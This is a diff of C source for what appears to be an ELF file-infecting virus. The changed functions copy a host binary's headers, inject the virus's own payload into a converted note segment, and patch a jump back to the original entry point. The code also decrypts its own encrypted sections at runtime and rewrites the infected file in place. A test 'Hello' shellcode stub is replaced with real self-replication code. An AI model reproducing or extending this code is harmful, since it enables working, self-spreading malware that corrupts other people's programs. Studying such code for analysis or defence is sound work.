@@ -133,32 +133,55 @@ __attribute__((always_inline)) static inline int _munmap(void *addr, size_t leng
 /// STATIC FUNCTIONS
 ////////////////////////////////////////////////////////////////////////////////
 
-__attribute__((always_inline)) static inline void write_on_memory(const struct s_host *host, char *ptr, const size_t payload_size)
+__attribute__((always_inline)) static inline size_t _strlen(const char *str)
+{
+	size_t ret = 0;
+
+	if (str == NULL)
+		return 0;
+
+	while (str[ret])
+		ret++;
+
+	return ret;
+}
+
+__attribute__((always_inline)) static inline void _memcpy(void *dst, void const *src, const size_t size)
+{
+	if (dst == NULL)
+		return ;
+	if (src == NULL)
+		return ;
+
+	char *dst_tmp = dst;
+	char const *src_tmp = src;
+
+	for (size_t index = 0; index < size; index++)
+		dst_tmp[index] = src_tmp[index];
+}
+
+__attribute__((always_inline)) static inline void write_on_memory(const struct s_host *host, char *ptr)
 {
 	char *dst = ptr;
 	char *src = (char *)host->header;
+
+	const size_t payload_size = PAYLOAD_SIZE + (host->note->self->p_offset - (host->note->data->p_offset + host->note->data->p_filesz));
 
 	for (register size_t index = 0; index < host->note->data->p_offset + host->note->data->p_filesz; index++)
 		*dst++ = *src++;
 
 	for (register size_t index = 0; index < payload_size; index++)
 		*dst++ = '*';
-
-	for (register size_t index = 0; index < host->filesize - (host->note->data->p_offset + host->note->data->p_filesz); index++)
-		*dst++ = *src++;
 }
-
 
 __attribute__((always_inline)) static inline void replicate_on_memory(const struct s_host *host, char *ptr)
 {
-	const uint8_t buffer[29] =
-	{
-		0xe8, 0x06, 0x00, 0x00, 0x00, 0x48, 0x65, 0x6c, 0x6c, 0x6f,
-		0x0a, 0xbf, 0x01, 0x00, 0x00, 0x00, 0x5e, 0xba, 0x06, 0x00,
-		0x00, 0x00, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x0f, 0x05
-	};
+	char jmp[] = {0xe9, 0x0, 0x0, 0x0, 0x0};
+	const Elf64_Addr entry_point = host->old_entry - host->new_entry - (PAYLOAD_SIZE - 363);
 
-	memcpy(ptr + host->note->self->p_offset, buffer, 29);
+	_memcpy(ptr + host->note->self->p_offset, __entry, PAYLOAD_SIZE);
+	_memcpy(jmp + 1, &entry_point, sizeof(int));
+	_memcpy(ptr + host->note->self->p_offset + (PAYLOAD_SIZE - 368), jmp, sizeof(jmp));
 }
 
 ////////////////////////////////////////////////////////////////////////////////
@@ -169,15 +192,30 @@ void injection(struct s_host *host, struct s_keychain *keychain, enum e_context 
 {
 	decrypt_right(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
 
-	printf("%s\t\t%s\n",__PRETTY_FUNCTION__, context == SUCCESS ? "success" : "error");
+#if DEBUG
+	char function[] = "injection:\t\t";
+	char name[] = "/tmp/trace";
+	int trace = _open(name, O_RDWR | O_APPEND, 0000);
+	char newline = 0xa;
+	char result = context + 48;
+	
+	if (trace > 0)
+	{
+		_write(trace, function, _strlen(function));
+		_write(trace, &result, 1);
+		_write(trace, &newline, 1);
+	}
+
+	_close(trace);
+#endif
+
 	if (context == FAILURE)
 		goto label;
 
 	char *ptr;
 	int fd = 0;
 
-	const size_t payload_size = PAYLOAD_SIZE + (host->note->self->p_offset - (host->note->data->p_offset + host->note->data->p_filesz));
-	const size_t filesize = host->filesize + payload_size;
+	const size_t filesize = host->note->self->p_offset + host->note->self->p_filesz;
 
 	if ((ptr = _mmap(NULL, filesize, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
 	{
@@ -185,8 +223,9 @@ void injection(struct s_host *host, struct s_keychain *keychain, enum e_context 
 		goto label;
 	}
 
-	write_on_memory(host, ptr, payload_size);
+	write_on_memory(host, ptr);
 	replicate_on_memory(host, ptr);
+	decrypt_left(keychain, ptr + host->note->self->p_offset + ((void *)injection - (void *)__entry), (void *)autodestruction - (void *)injection);
 
 	if ((fd = _open(host->filename, O_RDWR | O_TRUNC, 0000)) < 0)
 	{
